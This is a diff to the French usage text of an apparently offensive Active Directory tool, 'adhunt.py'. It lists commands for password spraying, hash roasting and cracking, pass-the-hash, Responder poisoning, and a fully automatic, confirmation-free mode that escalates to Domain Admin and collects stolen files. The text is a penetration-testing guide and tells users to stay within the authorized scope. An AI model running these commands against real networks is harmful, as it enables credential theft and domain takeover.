@@ -3061,26 +3061,38 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 ------------------------------------------------------------------------
- GUIDE  (tu as deja fait ton nmap -> donne l'IP du DC)
+ GUIDE  (tu as deja fait ton nmap -> donne l'IP du DC)   [V2 : + recon DNS]
 ------------------------------------------------------------------------
- Enum non-auth (users, AS-REP guest, roast+crack) :
-    python adhunt.py 10.10.10.10 -d corp.local
+ >> DEPART A FROID : trouver les USERS + un 1er cred (sans rien connaitre)
+    python adhunt.py 10.10.10.10 -d corp.local --spray
+      (recon DNS/SRV/AXFR -> null/RID/kerbrute = users ; AS-REP+crack ;
+       --spray = mots de passe communs, SANS bloquer les comptes)
 
- Enum AUTHENTIFIEE complete (LDAP, roast, GPP/LAPS, shares, crack) :
-    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Ete2024!'
-
- Avec un hash NTLM (pass-the-hash) :
-    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -H <nthash>
-
- + ESCALADE offensive (DCSync/ADCS/RBCD/DACL/disk/TRUST) + boucle jusqu'au DA :
+ >> LE "FAIS-TOUT" : des que tu as un cred, va jusqu'au Domain Admin
     python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Pass1' --exploit --loop --yes
+      (--exploit = escalade DCSync/ADCS/RBCD/DACL/TRUST ; --loop = re-enum a
+       chaque nouveau cred jusqu'au DA ; --yes = full-auto sans confirmation)
 
- Poisoning LLMNR/NBT-NS (Responder) -> capture + crack des hashes NetNTLM :
-    sudo python adhunt.py 10.10.10.10 -d corp.local --responder --iface eth0
+ >> Avec un hash NTLM au lieu du mot de passe (pass-the-hash) :
+    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -H <nthash> --exploit --loop --yes
 
- Options : --spray (password spray, opt-in), --safe (lecture seule),
-           --verbose (montre le detail a l'ecran), -o (dossier de sortie).
- Le detail complet (progression, erreurs) va dans loot/<domaine>/debug.log.
+ >> Poisoning LLMNR/NBT-NS (Responder) -> capture + crack des hashes NetNTLM :
+    sudo python adhunt.py 10.10.10.10 -d corp.local --responder --iface tun0
+      (--iface = SEULEMENT pour Responder/mitm6/coerce : ecoute L2 sur ton VLAN)
+
+------------------------------------------------------------------------
+ CE QUI TROUVE QUOI
+------------------------------------------------------------------------
+  USERS      : recon DNS (SRV) + null session + RID cycling + kerbrute + LDAP
+  PASSWORDS  : Kerberoast + AS-REP roast -> hashes -> CRACK auto (hashcat/john)
+               (--wordlist pour choisir ta liste, defaut rockyou)
+  CREDS clair: fouille des shares + GPP cpassword + LAPS + gMSA + descriptions
+  BONUS      : tout mdp trouve est REJOUE sur tous les comptes (reuse-spray)
+  Resultats  : tableau de bord live a l'ecran + loot/<domaine>/ (report.md,
+               report.json, *.hashes, fichiers voles, debug.log)
+
+ Autres options : --safe (lecture seule), --verbose (detail a l'ecran),
+                  --userlist / --passwordlist / --wordlist, -o (dossier sortie).
 
  /!\\ Reste STRICTEMENT dans le scope autorise de l'engagement.
 ------------------------------------------------------------------------
